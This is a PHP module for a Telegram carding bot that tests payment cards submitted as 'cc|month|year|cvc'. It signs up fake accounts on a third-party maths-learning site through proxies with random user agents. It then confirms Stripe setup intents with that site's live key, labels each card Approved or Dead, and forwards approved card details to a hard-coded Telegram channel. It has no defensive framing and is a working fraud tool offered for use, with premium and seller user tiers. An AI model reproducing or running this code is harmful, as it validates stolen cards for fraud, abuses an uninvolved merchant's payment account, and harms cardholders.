<?php

include('rnd-ua.php');

$pChkU = $isAdmin ? "Owner" : (in_array($user['id'], $f_data['premiuns']) ? "Premiun" : "Free");
if(in_array($user['id'], $sellers)){
$pChkU = "Seller";
}

$proxy = "🇺🇸 - Live!";
$gate = "𝙆𝙤𝙣𝙖𝙣";
$charged = "Auth";
$retry = 0;
//CHK Gate1
if(cCmd($msg['text'], ['/ko', '/Ko', '/kO', '/KO', '!ko', '!Ko', '!kO', '!KO', '.ko', '.Ko', '.kO', '.KO'])){
$eMsg = explode(' ', $msg['text']);
$cEMsg = count($eMsg);
$cBin = cBin($eMsg[1]);

$antiSpam = TRUE;
include('accs-as.php');

if($cEMsg == 1){
output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ".$gate." ♻️ -» <code>".$charged."</code>\n𝙁𝙤𝙧𝙢𝙖𝙩 -» <code>/ko cc|month|year|cvc</code>",
'reply_to_message_id' => $msg['message_id']
]);
}
else{
$msgId_bot = output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...",
'reply_to_message_id' => $msg['message_id']
])['result']['message_id'];

include('cc-analyzer.php');

if($cc == false || $month == false || $year == false || $cvv == false){
include('cc-errors.php');
}
else{
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>⚪️</code>"
]);
start:
/*=====  1REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, 'https://komodomath.com/signup?learners=1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: komodomath.com',
'User-Agent: '.$rnd_ua.'',
'Referer: https://komodomath.com/plans'
));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'cookie.txt');
$r1 = curl_exec($ch);
$csrf = trim(strip_tags(capture($r1, '"token" name="token" value="','">')));
if(empty($csrf)){
$retry++;
goto start;
}
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>🔴</code>"
]);
/*=====  2REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, 'https://komodomath.com/signup/api/create-lead');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: komodomath.com',
'X-CSRF-Token: '.$csrf.'',
'User-Agent: '.$rnd_ua.'',
'Content-Type: application/json;charset=UTF-8'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$mail.'","email_confirm":"'.$mail.'","firstname":"Sachio","lastname":"YT","password":"Sachio900*","num_learners":"1","learners":["","","","",""],"stickers":true,"address_opt":true,"address":"","post_code":"","address_zip":"","country":"","payment_method":"","plans":0,"coupon":""}');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'cookie.txt');
$r2 = curl_exec($ch);
$token = trim(strip_tags(capture($r2, '"token":"','"')));
if(empty($token)){
$retry++;
goto start;
}
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>🟡</code>"
]);
/*=====  3REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, 'https://komodomath.com/signup/api/setup');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: komodomath.com',
'Content-Type: application/json;charset=UTF-8',
'X-CSRF-Token: '.$csrf.'',
'User-Agent: '.$rnd_ua.''
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"token":"'.$token.'"}');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'cookie.txt');
$r3 = curl_exec($ch);
$cs = trim(strip_tags(capture($r3, '"client_secret":"','"'))); 
$seti = trim(strip_tags(capture($r3, '"id":"','"')));
if(empty($cs)){
$retry++;
goto start;
}
elseif(empty($cs)){
$retry++;
goto start;
}
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>🟢</code>"
]);
/*=====  4REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$seti.'/confirm');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'content-type: application/x-www-form-urlencoded',
'user-agent: '.$rnd_ua.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][email]='.$mail.'&payment_method_data[billing_details][name]=Sachio+YT&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$month.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[payment_user_agent]=stripe.js%2F1da9d2ae51%3B+stripe-js-v3%2F1da9d2ae51&payment_method_data[time_on_page]=49074&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_L4NONADbHPsRApU7HmyAFhVN&client_secret='.$cs.'');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'cookie.txt');
$r4 = curl_exec($ch);
$time = substr(curl_getinfo($ch)['total_time'], 0, 4)."'s";
curl_close($ch);
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>✨</code>"
]);
$st = capture($r4, '"status": "','"');
$code = capture($r4, '"code": "','"');
$msg1 = capture($r4, '"message": "','"');
if($code == "card_declined"){
$msg2 = capture($r4, '"decline_code": "','"');
}
if($st == "succeeded"){
$status = "Approved! ✅";
$status1 = "Approved!";
}
elseif($msg2 == "insufficient_funds"){
$status = "Approved! ✅ -» Cvv";
$status1 = "Insufficient Funds";
}
elseif($code == "incorrect_cvc"){
$status = "Approved! ✅ -» Ccn";
$status1 = "Your card's security code is incorrect.";
}
elseif($code == "card_declined"){
$status = "Dead! ❌";
$status1 = "$msg2";
}
elseif($st == "requires_action"){
$status = "Dead! ❌";
$status1 = "3D xD";
}
else{
$status = "Dead! ❌";
$status1 = "$msg1";
}

if($retry == 4){
$status = "Waos! ⛈";
$status1 = "Max Retry!";
}

$rChk = "
零 𝘾𝘾 -» <code>".$cc."|".$month."|".$year."|".$cvv."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>".$status."</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>".$status1."</code>

朱 𝘽𝙞𝙣 -» <code>".$cBin['brand']."</code> - <code>".$cBin['type']."</code> - <code>".$cBin['level']."</code>
亥 𝘽𝙖𝙣𝙠 -» <code>".$cBin['bank']."</code>
空 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code>".$cBin['country_name']." ".$cBin['flag']." - ".$cBin['currency_symbol']." ".$cBin['currency']."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>";
}
}
}
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => $rChk
]);

if($status == "Approved! ✅" || $status == "Approved! ✅ -» Cvv" || $status == "Approved! ✅ -» Ccn" || $status == "Approved! ✅ -» Charged!" || $status1 == "Approved! ✅ -» Cvv" || $status1 == "Approved! ✅ -» Charged!" || $status1 == "Approved! ✅ -» ccn" || $status1 == "Approved! ✅ -» cvv" || $status1 == "Approved! ✅ -» avs"){
output('sendMessage', [
'chat_id' => -1001701219924,
'message_id' => $msgId_bot,
'text' => $rChk
]);
}